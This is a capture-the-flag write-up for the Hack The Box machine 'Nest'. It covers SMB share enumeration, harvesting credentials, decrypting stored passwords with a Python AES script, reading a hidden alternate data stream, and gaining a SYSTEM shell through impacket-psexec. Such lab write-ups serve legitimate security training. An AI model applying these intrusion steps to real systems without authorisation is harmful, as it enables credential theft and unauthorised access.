---
title: "NEST"
date: 2025-02-04
layout: "simple"
categories: [Boot2root]
tags: [HackTheBox]
---


## Machine info
Nest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user. This user is found to have access to configuration files containing sensitive information. Another user and password is found through source code analysis, which is used to gain a foothold on the box. A custom service is found to be running, which is enumerated to find and decrypt Administrator credentials.

## Enumeration
### Network Mapping

Using `nmap` we will try and figure out what ports are open.

`sudo nmap -sVC -T4 10.10.10.178 -vvv -oN nmap.txt`

```shell
# Nmap 7.94SVN scan initiated Sun Jul 28 21:34:48 2024 as: nmap -sVC -T4 -vvv -oN nmap.txt 10.10.10.178
Nmap scan report for 10.10.10.178
Host is up, received echo-reply ttl 127 (0.14s latency).
Scanned at 2024-07-28 21:34:49 EAT for 71s
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE       REASON          VERSION
445/tcp open  microsoft-ds? syn-ack ttl 127

Host script results:
| smb2-time: 
|   date: 2024-07-28T18:35:23
|_  start_date: 2024-07-28T18:31:24
|_clock-skew: -1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28056/tcp): CLEAN (Timeout)
|   Check 2 (port 40075/tcp): CLEAN (Timeout)
|   Check 3 (port 17014/udp): CLEAN (Timeout)
|   Check 4 (port 41379/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 28 21:36:00 2024 -- 1 IP address (1 host up) scanned in 71.82 seconds
```
One open port so far. Port 445 is a network port used for Server Message Block (SMB) protocol communication
`smbclient -L 10.10.10.178`

### SMB Enumeration

Find shares with guest access.
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk 
```

`smbclient '\\10.10.10.178\Users'`

Find couple of users. Enumerate through all of them.

```
smbclient '\\10.10.10.178\Users'                                                            
Password for [WORKGROUP\dexter]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 02:04:21 2020
  ..                                  D        0  Sun Jan 26 02:04:21 2020
  Administrator                       D        0  Fri Aug  9 18:08:23 2019
  C.Smith                             D        0  Sun Jan 26 10:21:44 2020
  L.Frost                             D        0  Thu Aug  8 20:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 20:02:50 2019
  TempUser                            D        0  Thu Aug  8 01:55:56 2019

                5242623 blocks of size 4096. 1840267 blocks available
smb: \> 

```

Connect to the Data share and enumerate.
`smbclient '\\10.10.10.178\Data'`

```
smbclient '\\10.10.10.178\Data'                                                                                                                                   
Password for [WORKGROUP\dexter]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug  8 01:53:46 2019
  ..                                  D        0  Thu Aug  8 01:53:46 2019
  IT                                  D        0  Thu Aug  8 01:58:07 2019
  Production                          D        0  Tue Aug  6 00:53:38 2019
  Reports                             D        0  Tue Aug  6 00:53:44 2019
  Shared                              D        0  Wed Aug  7 22:07:51 2019

```

We find some file in Shared directory 
```
smb: \Shared\> ls
  .                                   D        0  Wed Aug  7 22:07:51 2019
  ..                                  D        0  Wed Aug  7 22:07:51 2019
  Maintenance                         D        0  Wed Aug  7 22:07:32 2019
  Templates                           D        0  Wed Aug  7 22:08:07 2019

                5242623 blocks of size 4096. 1831905 blocks available

```

We find some credentials from `TempUser` on a template. 

```
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR%    
```

We can then access the users share and then go to the `TempUser` of which the credentials have been found.  We then find another text file which seems to be empty.

We can then go back to enumeration and find anything that we might have missed . Doing an `nmap` scan again reveals an extra port that seems unknown at first.

`sudo nmap -p- --min-rate 10000 10.10.10.178`

This reveals another port open on the machine. Since at first it displays unknown we can do a banner grabbing technique to get the service running. HQK reporting service is running on the port.  
```shell
nc -v 10.10.10.178 4386                                                                                                                                         
10.10.10.178: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.178] 4386 (?) open

HQK Reporting Service V1.2

```

Re enumerating in SMB we can find some more files in that we can check. This set of commands help us to download all the files from the share into our local machine.
```shell
recurse ON
prompt OFF
mget *
```


### Source Code analysis
Checking through all the files we can find two interesting files that gives us alot more information. For example, we get some credentials for a user `C.Smith` that we could use.
<img width="594" alt="image" src="https://gist.github.com/user-attachments/assets/e4fc609d-33b1-44a0-abe8-ee85dc07eab0">
Next we also find some paths we can use as directed by the notepadplusplus config file. 

<img width="322" alt="image" src="https://gist.github.com/user-attachments/assets/8dcdc0a6-be06-4f53-8ae8-ab1c6cec6eef">

<img width="464" alt="image" src="https://gist.github.com/user-attachments/assets/be88c9eb-736b-466e-abc2-59c269d6ada9">
For some reason most shares are not really accessible but, this particular directory works. As we got it from the previous list of directories. We then download all files again and start scanning through. 
Inside the VB projects we do find something interesting. Something like Visual basic project. 
```vb
cat ConfigFile.vb                                                                                                                             
Public Class ConfigFile

    Public Property Port As Integer
    Public Property Username As String
    Public Property Password As String

    Public Sub SaveToFile(Path As String)
        Using File As New IO.FileStream(Path, IO.FileMode.Create)
            Dim Writer As New Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Writer.Serialize(File, Me)
        End Using
    End Sub

    Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile
        Using File As New IO.FileStream(FilePath, IO.FileMode.Open)
            Dim Reader As New Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Return DirectCast(Reader.Deserialize(File), ConfigFile)
        End Using
    End Function


End Class
```

First is the config file that gives us an idea that there is a password string from somewhere, this could make sense since we also found a password string earlier.

```vb                    
Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
       


    End Sub

End Module

```
 
This file then tells us that there is some sort of decryption that is going on.

```vb
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function




    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function

End Class

```

### Cracking the password
From this we do get a few things example
`symmetricKey.Mode = CipherMode.CBC`

`Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)`

This two give us an idea of how to decrypt the string. Since we get the cipher mode and the Encrypt function.
Might have to use python for this. 
```python
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
import base64

def decrypt(ciphertext, password, salt, iterations, iv, key_size):
    cipher_bytes = base64.b64decode(ciphertext)
    salt_bytes = salt.encode('utf-8')
    iv_bytes = iv.encode('utf-8')

    key = PBKDF2(password, salt_bytes, dkLen=key_size // 8, count=iterations)

    cipher = AES.new(key, AES.MODE_CBC, iv_bytes)

    decrypted = unpad(cipher.decrypt(cipher_bytes), AES.block_size)
    return decrypted.decode('utf-8')

ciphertext = "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="
password = "N3st22"
salt = "88552299"
iterations = 2
iv = "464R5DFA5DL6LE28"
key_size = 256

decrypted_text = decrypt(ciphertext, password, salt, iterations, iv, key_size)
print("Decrypted Text: ", decrypted_text)

```

This results to a password found `xRxRxPANCAK3SxRxRx`
We can now try and access SMB shares using the credentials found. 
```shell
smbclient '\\10.10.10.178\Users' -U C.Smith --password=xRxRxPANCAK3SxRxRx                                                                     
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 02:04:21 2020
  ..                                  D        0  Sun Jan 26 02:04:21 2020
  Administrator                       D        0  Fri Aug  9 18:08:23 2019
  C.Smith                             D        0  Sun Jan 26 10:21:44 2020
  L.Frost                             D        0  Thu Aug  8 20:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 20:02:50 2019
  TempUser                            D        0  Thu Aug  8 01:55:56 2019

                5242623 blocks of size 4096. 1839995 blocks available
smb: \> 

```

In the C.Smith directory we find some files that we can download as well. But checking the debug password text file we see that it has 0 bytes.

```shell
smb: \C.Smith\HQK reporting\> ls
  .                                   D        0  Fri Aug  9 02:06:17 2019
  ..                                  D        0  Fri Aug  9 02:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 15:18:42 2019
  Debug Mode Password.txt             A        0  Fri Aug  9 02:08:17 2019
  HQK_Config_Backup.xml               A      249  Fri Aug  9 02:09:05 2019
```

But based on another box from hack the box I recall that there was a specific box that did the same with a root flag. So we might need to check this file deeper. Checking the Debug password text file using `allinfo` we initially find that the file 15 bytes in password.
```shell
smb: \C.Smith\HQK reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Fri Aug  9 02:06:12 2019 EAT
access_time:    Fri Aug  9 02:06:12 2019 EAT
write_time:     Fri Aug  9 02:08:17 2019 EAT
change_time:    Wed Jul 21 21:47:12 2021 EAT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes

```

We can then download this file using.
```shell
smb: \C.Smith\HQK reporting\> get "Debug Mode Password.txt:Password"
getting file \C.Smith\HQK reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \C.Smith
```

We do actually get a password now. 
```shell
cat Debug\ Mode\ Password.txt:Password                              
WBQ201953D8w 
```

### HQK service tool 

From here we can revisit the HQK reporting service tool. Where we can use telnet to get a connection. we can also add a `rlwrap` which runs the specified _command_, intercepting user input in order to provide `readline's` line editing, persistent history and completion.
```shell
rlwrap telnet 10.10.10.178 4386                                                                                                                    
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>

```

Nice, now with the password got earlier from debug mode password text file, we can do. 
`debug <password>`
We now have more powers. 
```shell
>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

```

Running the service command we see some more information. 
```shell
>service

--- HQK REPORTING SERVER INFO ---

Version: 1.2.0.0
Server Hostname: HTB-NEST
Server Process: "C:\Program Files\HQK\HqkSvc.exe"
Server Running As: Service_HQK
Initial Query Directory: C:\Program Files\HQK\ALL QUERIES

```

We can change directories using the `setdir` command 
```shell
Unrecognised command
>setdir C:\Program Files\HQK\

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>
```

We can enumerate through this directories and see what they entail. 
Inside the `LDAP` directory we can see that we have a configuration file which contains the admin password. Encrypted as well I guess. 
```shell
>setdir C:\Program Files\HQK\LDAP

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

```
### Even more source code analysis

We can then analyze this program using [dnSpy](https://github.com/dnSpy/dnSpy/releases). But I do not have any idea on how to use that so I just re used my script.
This function gave us an idea on the password, the salt, the IV and iterations

`return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);`

Swapping out the variables we can crack the admin password.

```python
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
import base64

def decrypt(ciphertext, password, salt, iterations, iv, key_size):
    cipher_bytes = base64.b64decode(ciphertext)
    salt_bytes = salt.encode('utf-8')
    iv_bytes = iv.encode('utf-8')

    key = PBKDF2(password, salt_bytes, dkLen=key_size // 8, count=iterations)

    cipher = AES.new(key, AES.MODE_CBC, iv_bytes)

    decrypted = unpad(cipher.decrypt(cipher_bytes), AES.block_size)
    return decrypted.decode('utf-8')

ciphertext = "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="
password = "667912"
salt = "1313Rf99"
iterations = 3
iv = "1L1SA61493DRV53Z"
key_size = 256

decrypted_text = decrypt(ciphertext, password, salt, iterations, iv, key_size)
print("Decrypted Text: ", decrypted_text)
```

After cracking the password we can use psexec from impacket to connect to the machine.

```shell
impacket-psexec nest.local/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178                                                                             
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file QekKfGAJ.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service GsMY on 10.10.10.178.....
[*] Starting service GsMY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

## Further notes
- Netcat did not work, telnet worked.
- Debug password was 0 bytes apparently but using `allinfo` in `SMB` revealed a lot more information.
- Should probably learn how to use dnSpy. Python came in clutch. 


